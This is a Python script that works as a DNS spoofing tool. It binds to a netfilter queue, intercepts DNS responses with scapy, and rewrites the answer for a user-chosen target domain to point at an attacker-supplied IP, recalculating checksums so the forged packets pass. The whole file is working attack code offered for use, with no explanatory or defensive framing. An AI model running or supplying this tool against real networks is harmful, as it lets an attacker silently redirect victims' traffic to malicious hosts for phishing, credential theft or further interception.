#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import argparse

TARGET_SITE = ""
REDIRECT_SITE = ""

def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target site to spoof")
    parser.add_argument("-r", "--redirect", dest="redirect", help="Redirect spoofed requests to")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-]Please specify target site to spoof")
    elif not options.redirect:
        parser.error("[-]Please ip to redirect spoofed requests")
    return options

def process_packet(packet):
    global TARGET_SITE
    global REDIRECT_SITE
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        #if TARGET_SITE in str(qname):   #python 3
        if TARGET_SITE in qname:  #python 2
            print("[+] Target site requested. - Spoofing to : "+REDIRECT_SITE)
            answer = scapy.DNSRR(rrname = qname, rdata = REDIRECT_SITE)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            if scapy_packet.haslayer(scapy.IP):
                if scapy_packet[scapy.IP].len:
                    del scapy_packet[scapy.IP].len
                if scapy_packet[scapy.IP].chksum:
                    del scapy_packet[scapy.IP].chksum
            if scapy_packet.haslayer(scapy.UDP):
                if scapy_packet[scapy.UDP].len:
                    del scapy_packet[scapy.UDP].len
                if scapy_packet[scapy.UDP].chksum:
                    del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(str(scapy_packet))  #python 2
            #packet.set_payload(str(scapy_packet).encode())        #python 3
            
    packet.accept()
    

options = get_argument()
TARGET_SITE = options.target
REDIRECT_SITE = options.redirect
    
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Detected CTRL + C ....... Quitting.")